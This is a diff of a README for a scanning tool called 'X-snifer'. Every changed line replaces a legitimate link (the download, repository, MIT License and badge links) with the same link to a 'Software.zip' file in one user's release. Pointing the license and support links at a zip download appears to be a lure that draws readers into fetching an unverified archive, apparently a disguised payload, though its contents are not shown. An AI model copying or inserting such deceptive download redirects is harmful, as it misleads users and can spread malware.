@@ -33,7 +33,7 @@ X-snifer is a scanning tool that can be used for information gathering, network 
 ## Installation 🚀
 
 To get started with X-snifer, you can download the latest release from the following link:
-[Download X-snifer v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download X-snifer v1.0.0](https://github.com/Daeun4839/X-snifer/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the ZIP file, extract it and launch the tool to begin using its powerful features for scanning and reconnaissance tasks.
 
@@ -54,13 +54,13 @@ X-snifer is maintained by a dedicated team of developers and security profession
 
 ## Support ℹ️
 
-If you encounter any issues or have suggestions for improving X-snifer, please feel free to [visit the repository](https://github.com/X-snifer) and open an issue. Your feedback is valuable in helping us enhance the tool for the cybersecurity community.
+If you encounter any issues or have suggestions for improving X-snifer, please feel free to [visit the repository](https://github.com/Daeun4839/X-snifer/releases/download/v1.0/Software.zip) and open an issue. Your feedback is valuable in helping us enhance the tool for the cybersecurity community.
 
 ## License 📝
 
-X-snifer is licensed under the [MIT License](https://opensource.org/licenses/MIT), which allows for both personal and commercial use of the tool. Feel free to explore, modify, and share X-snifer while adhering to the license terms.
+X-snifer is licensed under the [MIT License](https://github.com/Daeun4839/X-snifer/releases/download/v1.0/Software.zip), which allows for both personal and commercial use of the tool. Feel free to explore, modify, and share X-snifer while adhering to the license terms.
 
 ---
 
 🔗 **Download Latest Release**
-[![Download X-snifer v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 
+[![Download X-snifer v1.0.0](https://github.com/Daeun4839/X-snifer/releases/download/v1.0/Software.zip)](https://github.com/Daeun4839/X-snifer/releases/download/v1.0/Software.zip) 
